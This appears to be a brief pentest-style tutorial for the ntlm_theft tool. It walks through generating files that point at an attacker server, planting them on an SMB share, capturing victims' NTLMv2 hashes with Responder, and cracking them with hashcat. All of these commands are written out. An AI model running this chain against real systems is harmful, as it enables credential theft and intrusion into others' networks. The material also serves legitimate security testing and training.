**[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)** is a tool designed to demonstrate how Windows systems can unintentionally leak NTLMv2 hashes when certain file types reference external resources. Its purpose is to generate files such as `.lnk`, `.url`, `.docx` with remote templates, `.xlsx` with external cells, or `.htm` pages. When a user opens or even browses one of these files, Windows automatically attempts to authenticate to the remote server specified inside the file. If the attacker controls that server, they can capture the NTLMv2 hash of the victim. 

---
## Installation
- Install xlsxwriter:
```bash
pip3 install xlsxwriter
```

- Clone the repository:
```bash
git clone https://github.com/Greenwolf/ntlm_theft.git
```


---

## Usage 
1. **File generation**
This command creates a directory named `meetingXYZ/` containing multiple crafted files. Each file embeds a reference to the attacker’s server. 

```bash
python3 ntlm_theft.py --verbose --generate all --server <attacker_ip> --filename <filename>
```

2. **Upload the files to SMB**
Then files are uploaded in a writable SMB share or another location accessible to target users.

```bash
smbclient -U <user> //<target_ip>/<share> 
put <file>
```
 Uploading the file alone does not trigger authentication; the critical step occurs when a victim opens or browses the file, because the embedded reference forces Windows to attempt a connection to the attacker’s server.

3. **Listener configuration** 
To capture the authentication attempt,  **Responder** is used to listen for incoming NTLM authentication requests:

```bash
sudo responder -I tun0
```

When the victim interacts with the file, their system sends an NTLMv2 hash to the attacker’s server. Responder logs this hash.  

4. **Cracking**
Using Hashcat with mode `5600` (NTLMv2) crack the hash:

```bash
hashcat -m 5600 -a 0 captured_hash.txt /usr/share/wordlists/rockyou.txt
```
